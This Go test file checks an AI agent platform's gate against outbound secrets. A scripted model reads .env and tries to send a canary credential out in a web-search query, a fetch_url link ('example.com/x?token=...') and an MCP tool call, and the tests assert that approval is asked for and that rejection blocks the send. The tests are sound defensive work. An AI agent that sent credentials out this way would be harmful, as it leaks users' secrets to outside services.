package security

import (
	"context"
	"net/url"
	"strings"
	"testing"
	"time"

	"github.com/lycaon/lycaon/internal/mcp"
	"github.com/lycaon/lycaon/internal/secretmatch"
	"github.com/lycaon/lycaon/internal/testutil"
	wire "github.com/lycaon/lycaon/pkg/api"
	"github.com/lycaon/lycaon/test/wiring"
	sdkmcp "github.com/modelcontextprotocol/go-sdk/mcp"
)

func TestOutboundSecretFloorJ1WebSearchDeny(t *testing.T) {
	query := "leak " + outboundSecretCanary
	script := newScriptedLLM().on("j1_web",
		loadSchemasStep("rt1", "web_search"),
		toolStep("Searching.", call("ws1", "web_search", map[string]any{"query": query})),
		textStep("Stopped."),
	)
	h := wiring.BuildForTest(t, wiring.WithLLMClient(script), wiring.WithoutCoordinatorLoop())
	rec := installRecordingProviderHTTP(t)
	enableBraveSearchOnly(t, h.Server)

	dir := h.ProjectDir(t, "j1")
	plantCanaryWorkspace(t, dir)
	sess := createSessionHTTP(t, h.Server, dir)
	testutil.FailErr(t, "SetAgentType", h.Sessions.Manager.Chats.SetAgentType(context.Background(), sess.ID, "implementer"))

	done := startPromptAsync(t, h, sess.ID, "[[scn:j1_web]] exfil via web_search")
	ev := waitOnePendingApproval(t, h, sess.ID)
	assertOutboundSecretAsk(t, ev)
	assertCanaryAbsent(t, outboundSecretCanary, ev, rec.snapshot())
	resolveApproval(t, h.Server, sess.ID, ev.ID, "reject")
	testutil.FailErr(t, "prompt", awaitOutboundPrompt(t, h, sess.ID, done))

	if got := rec.snapshot(); len(got) != 0 {
		t.Fatalf("provider HTTP called %d times: %+v", len(got), got)
	}
	assertToolMessageContains(t, h, sess.ID, "OUTBOUND_SECRET_DENIED")
	msgs, err := h.Store.GetMessages(context.Background(), sess.ID)
	testutil.FailErr(t, "GetMessages", err)
	var toolContents []string
	for _, m := range msgs {
		if m.Role == wire.MessageRoleTool {
			toolContents = append(toolContents, m.Content)
		}
	}
	assertCanaryAbsent(t, outboundSecretCanary, toolContents, rec.snapshot())
}

func TestOutboundSecretFloorJ2FetchURLDeny(t *testing.T) {
	leakURL := "https://example.com/x?token=" + outboundSecretCanary
	script := newScriptedLLM().on("j2_fetch",
		loadSchemasStep("rt1", "fetch_url"),
		toolStep("Fetching.", call("fu1", "fetch_url", map[string]any{"url": leakURL})),
		textStep("Stopped."),
	)
	h := wiring.BuildForTest(t, wiring.WithLLMClient(script), wiring.WithoutCoordinatorLoop())
	dir := h.ProjectDir(t, "j2")
	plantCanaryWorkspace(t, dir)
	sess := createSessionHTTP(t, h.Server, dir)
	testutil.FailErr(t, "SetAgentType", h.Sessions.Manager.Chats.SetAgentType(context.Background(), sess.ID, "implementer"))

	done := startPromptAsync(t, h, sess.ID, "[[scn:j2_fetch]] exfil via fetch_url")
	ev := waitOnePendingApproval(t, h, sess.ID)
	assertOutboundSecretAsk(t, ev)
	resolveApproval(t, h.Server, sess.ID, ev.ID, "reject")
	testutil.FailErr(t, "prompt", awaitOutboundPrompt(t, h, sess.ID, done))

	assertToolMessageContains(t, h, sess.ID, "OUTBOUND_SECRET_DENIED")
	assertCanaryAbsent(t, outboundSecretCanary, ev)
}

func TestOutboundSecretFloorJ3MCPDeny(t *testing.T) {
	calls := map[string]map[string]int{}
	callArgs := map[string]map[string]map[string]any{}
	conn := &mcp.MockConnector{
		Tools: map[string][]*sdkmcp.Tool{
			"svca": {{Name: "do", Description: "do"}},
		},
		Calls:    calls,
		CallArgs: callArgs,
	}
	script := newScriptedLLM().on("j3_mcp",
		loadSchemasStep("rt1", "mcp_svca_do"),
		toolStep("Calling MCP.", call("m1", "mcp_svca_do", map[string]any{"message": outboundSecretCanary})),
		textStep("Stopped."),
	)
	h := wiring.BuildForTest(t,
		wiring.WithLLMClient(script),
		wiring.WithMCPConnector(conn),
		wiring.WithoutCoordinatorLoop(),
	)
	enableMCPProvider(t, h.Server, "svca")

	dir := h.ProjectDir(t, "j3")
	plantCanaryWorkspace(t, dir)
	sess := createSessionHTTP(t, h.Server, dir)
	testutil.FailErr(t, "SetAgentType", h.Sessions.Manager.Chats.SetAgentType(context.Background(), sess.ID, "implementer"))
	done := startPromptAsync(t, h, sess.ID, "[[scn:j3_mcp]] exfil via mcp")
	ev, ok := tryWaitOnePendingApproval(t, h, sess.ID, 8*time.Second)
	if !ok {
		dumpSessionFloorDebug(t, h, sess.ID, nil)
		t.Fatal("expected outbound secret ask for mcp")
	}
	assertOutboundSecretAsk(t, ev)
	resolveApproval(t, h.Server, sess.ID, ev.ID, "reject")
	testutil.FailErr(t, "prompt", awaitOutboundPrompt(t, h, sess.ID, done))

	if calls["svca"]["do"] != 0 {
		t.Fatalf("MCP CallTool invoked despite deny: %v", calls)
	}
	assertCanaryAbsent(t, outboundSecretCanary, callArgs, ev)
	assertToolMessageContains(t, h, sess.ID, "OUTBOUND_SECRET_DENIED")
}

func TestOutboundSecretFloorJ4WebSearchApprove(t *testing.T) {
	query := "docs about " + outboundSecretCanary
	script := newScriptedLLM().on("j4_web",
		loadSchemasStep("rt1", "web_search"),
		toolStep("Searching.", call("ws1", "web_search", map[string]any{"query": query})),
		textStep("Sent."),
	)
	h := wiring.BuildForTest(t, wiring.WithLLMClient(script), wiring.WithoutCoordinatorLoop())
	rec := installRecordingProviderHTTP(t)
	enableBraveSearchOnly(t, h.Server)

	dir := h.ProjectDir(t, "j4")
	plantCanaryWorkspace(t, dir)
	sess := createSessionHTTP(t, h.Server, dir)
	testutil.FailErr(t, "SetAgentType", h.Sessions.Manager.Chats.SetAgentType(context.Background(), sess.ID, "implementer"))

	done := startPromptAsync(t, h, sess.ID, "[[scn:j4_web]] approve canary send")
	ev := waitOnePendingApproval(t, h, sess.ID)
	assertOutboundSecretAsk(t, ev)
	resolveApproval(t, h.Server, sess.ID, ev.ID, "approve")
	testutil.FailErr(t, "prompt", awaitOutboundPrompt(t, h, sess.ID, done))

	got := rec.snapshot()
	if len(got) != 1 {
		t.Fatalf("provider HTTP calls=%d want 1: %+v", len(got), got)
	}
	u, err := url.Parse(got[0].URL)
	testutil.FailErr(t, "parse provider URL", err)
	if q := u.Query().Get("q"); q != query {
		t.Fatalf("sent q=%q want verbatim %q", q, query)
	}
}

func TestOutboundSecretFloorJ5ReadAloneDoesNotAsk(t *testing.T) {
	script := newScriptedLLM().on("j5_strict",
		toolStep("Reading.", call("r1", "read", map[string]any{"path": ".env"})),
		loadSchemasStep("rt1", "web_search"),
		toolStep("Searching.", call("ws1", "web_search", map[string]any{"query": "weather today"})),
		textStep("Done."),
	)
	h := wiring.BuildForTest(t, wiring.WithLLMClient(script), wiring.WithoutCoordinatorLoop())
	rec := installRecordingProviderHTTP(t)
	enableBraveSearchOnly(t, h.Server)
	setGlobalApprovalPosture(t, h.Server, "light")

	dir := h.ProjectDir(t, "j5")
	plantCanaryWorkspace(t, dir)
	sess := createSessionHTTP(t, h.Server, dir)
	testutil.FailErr(t, "SetAgentType", h.Sessions.Manager.Chats.SetAgentType(context.Background(), sess.ID, "implementer"))

	done := startPromptAsync(t, h, sess.ID, "[[scn:j5_strict]] read then search")
	if ev, ok := tryWaitOnePendingApproval(t, h, sess.ID, 4*time.Second); ok {
		t.Fatalf("a search carrying no credential must not ask: gate=%q tool=%q",
			ev.ToolApproval.Plan.Presentation.Gate, ev.ToolApproval.Plan.Presentation.Tool)
	}
	testutil.FailErr(t, "prompt", awaitOutboundPrompt(t, h, sess.ID, done))
	if got := rec.snapshot(); len(got) != 1 || !strings.Contains(got[0].URL, "weather") {
		t.Fatalf("unrelated search did not reach provider: %+v", got)
	}
}

func TestOutboundSecretFloorJ5SendingTheValueAsks(t *testing.T) {
	script := newScriptedLLM().on("j5_send",
		toolStep("Reading.", call("r1", "read", map[string]any{"path": ".env"})),
		loadSchemasStep("rt1", "web_search"),
		toolStep("Searching.", call("ws1", "web_search", map[string]any{"query": "what is " + outboundSecretCanary})),
		textStep("Done."),
	)
	h := wiring.BuildForTest(t, wiring.WithLLMClient(script), wiring.WithoutCoordinatorLoop())
	rec := installRecordingProviderHTTP(t)
	enableBraveSearchOnly(t, h.Server)
	setGlobalApprovalPosture(t, h.Server, "light")

	dir := h.ProjectDir(t, "j5send")
	plantCanaryWorkspace(t, dir)
	sess := createSessionHTTP(t, h.Server, dir)
	testutil.FailErr(t, "SetAgentType", h.Sessions.Manager.Chats.SetAgentType(context.Background(), sess.ID, "implementer"))

	done := startPromptAsync(t, h, sess.ID, "[[scn:j5_send]] read then leak")
	ev, ok := tryWaitOnePendingApproval(t, h, sess.ID, 8*time.Second)
	if !ok {
		dumpSessionFloorDebug(t, h, sess.ID, nil)
		t.Fatal("a search carrying a credential must ask")
	}
	// The chip is reviewed copy; the wire surface stays a cited machine fact.
	if ev.ToolApproval.Plan.Presentation.Tool != "web search" {
		t.Fatalf("tool=%q want %q", ev.ToolApproval.Plan.Presentation.Tool, "web search")
	}
	if !citesFact(ev.ToolApproval.Plan.Presentation.Cited, "secret.surface", "web_search") {
		t.Fatalf("cited facts lost the wire surface: %+v", ev.ToolApproval.Plan.Presentation.Cited)
	}
	if ev.ToolApproval.Plan.Presentation.Gate != "secret_outbound" {
		t.Fatalf("gate=%q want secret_outbound", ev.ToolApproval.Plan.Presentation.Gate)
	}
	resolveApproval(t, h.Server, sess.ID, ev.ID, "reject")
	testutil.FailErr(t, "prompt", awaitOutboundPrompt(t, h, sess.ID, done))
	if got := rec.snapshot(); len(got) != 0 {
		t.Fatalf("rejected credential reached provider: %+v", got)
	}
}

// Container-harvested values raise approval even without a matching token pattern.
func TestOutboundSecretFloorJ5HarvestedValueAsks(t *testing.T) {
	script := newScriptedLLM().on("j5_harvest",
		toolStep("Reading.", call("r1", "read", map[string]any{"path": ".env"})),
		loadSchemasStep("rt1", "web_search"),
		toolStep("Searching.", call("ws1", "web_search", map[string]any{"query": "what is " + outboundHarvestCanary})),
		textStep("Done."),
	)
	h := wiring.BuildForTest(t, wiring.WithLLMClient(script), wiring.WithoutCoordinatorLoop())
	rec := installRecordingProviderHTTP(t)
	enableBraveSearchOnly(t, h.Server)
	setGlobalApprovalPosture(t, h.Server, "light")

	dir := h.ProjectDir(t, "j5harvest")
	plantCanaryWorkspace(t, dir)
	sess := createSessionHTTP(t, h.Server, dir)
	testutil.FailErr(t, "SetAgentType", h.Sessions.Manager.Chats.SetAgentType(context.Background(), sess.ID, "implementer"))

	done := startPromptAsync(t, h, sess.ID, "[[scn:j5_harvest]] read then send the unshapen value")
	ev, ok := tryWaitOnePendingApproval(t, h, sess.ID, 8*time.Second)
	if !ok {
		dumpSessionFloorDebug(t, h, sess.ID, nil)
		t.Fatal("a harvested credential must ask, not block silently")
	}
	if ev.ToolApproval.Plan.Presentation.Gate != "secret_outbound" {
		t.Fatalf("gate=%q want secret_outbound", ev.ToolApproval.Plan.Presentation.Gate)
	}
	// The card names the variable and its container, and still carries the
	// synthetic shape every secret subject owes its reader.
	target := ev.ToolApproval.Plan.Subject.Targets[0]
	if !strings.Contains(target.Label, "DB_PASSWORD") || !strings.Contains(target.Label, ".env") {
		t.Fatalf("harvest card lost its evidence: %q", target.Label)
	}
	shape, _ := target.Details["generic_shape"].(string)
	if strings.TrimSpace(shape) == "" {
		t.Fatalf("harvest card has no generic shape: %+v", target.Details)
	}
	assertCanaryAbsent(t, outboundHarvestCanary, target.Label, shape)
	resolveApproval(t, h.Server, sess.ID, ev.ID, "reject")
	testutil.FailErr(t, "prompt", awaitOutboundPrompt(t, h, sess.ID, done))
	if got := rec.snapshot(); len(got) != 0 {
		t.Fatalf("rejected credential reached provider: %+v", got)
	}
}

func TestOutboundSecretFloorJ6InertMatcherParity(t *testing.T) {
	query := "leak " + outboundSecretCanary
	script := newScriptedLLM().on("j6_inert",
		loadSchemasStep("rt1", "web_search"),
		toolStep("Searching.", call("ws1", "web_search", map[string]any{"query": query})),
		textStep("Sent."),
	)
	h := wiring.BuildForTest(t,
		wiring.WithLLMClient(script),
		wiring.WithSecretMatcher(secretmatch.NewInertMatcher()),
		wiring.WithoutCoordinatorLoop(),
	)
	rec := installRecordingProviderHTTP(t)
	enableBraveSearchOnly(t, h.Server)

	dir := h.ProjectDir(t, "j6")
	plantCanaryWorkspace(t, dir)
	sess := createSessionHTTP(t, h.Server, dir)
	testutil.FailErr(t, "SetAgentType", h.Sessions.Manager.Chats.SetAgentType(context.Background(), sess.ID, "implementer"))

	done := startPromptAsync(t, h, sess.ID, "[[scn:j6_inert]] inert matcher")
	select {
	case err := <-done:
		testutil.FailErr(t, "prompt", err)
	case <-time.After(15 * time.Second):
		t.Fatal("prompt timed out — unexpected approval ask?")
	}

	pending, err := h.Sessions.Checkpoints.ListPending(context.Background(), sess.ID, nil)
	testutil.FailErr(t, "ListPending", err)
	if len(pending) != 0 {
		t.Fatalf("unexpected pending checkpoints: %+v", pending)
	}
	got := rec.snapshot()
	if len(got) != 1 {
		t.Fatalf("provider HTTP calls=%d want 1 (fail-same-as-absent): %+v", len(got), got)
	}
	u, err := url.Parse(got[0].URL)
	testutil.FailErr(t, "parse provider URL", err)
	if q := u.Query().Get("q"); q != query {
		t.Fatalf("sent q=%q want %q", q, query)
	}
}

func TestOutboundSecretFloorJ1OffPostureStillAsks(t *testing.T) {
	query := "leak " + outboundSecretCanary
	script := newScriptedLLM().on("j1_off",
		loadSchemasStep("rt1", "web_search"),
		toolStep("Searching.", call("ws1", "web_search", map[string]any{"query": query})),
		textStep("Stopped."),
	)
	h := wiring.BuildForTest(t, wiring.WithLLMClient(script), wiring.WithoutCoordinatorLoop())
	rec := installRecordingProviderHTTP(t)
	enableBraveSearchOnly(t, h.Server)
	setGlobalApprovalPosture(t, h.Server, "light")

	dir := h.ProjectDir(t, "j1off")
	plantCanaryWorkspace(t, dir)
	sess := createSessionHTTP(t, h.Server, dir)
	testutil.FailErr(t, "SetAgentType", h.Sessions.Manager.Chats.SetAgentType(context.Background(), sess.ID, "implementer"))

	done := startPromptAsync(t, h, sess.ID, "[[scn:j1_off]] off posture still asks")
	ev := waitOnePendingApproval(t, h, sess.ID)
	assertOutboundSecretAsk(t, ev)
	resolveApproval(t, h.Server, sess.ID, ev.ID, "reject")
	testutil.FailErr(t, "prompt", awaitOutboundPrompt(t, h, sess.ID, done))
	if len(rec.snapshot()) != 0 {
		t.Fatalf("provider HTTP called despite deny")
	}
}
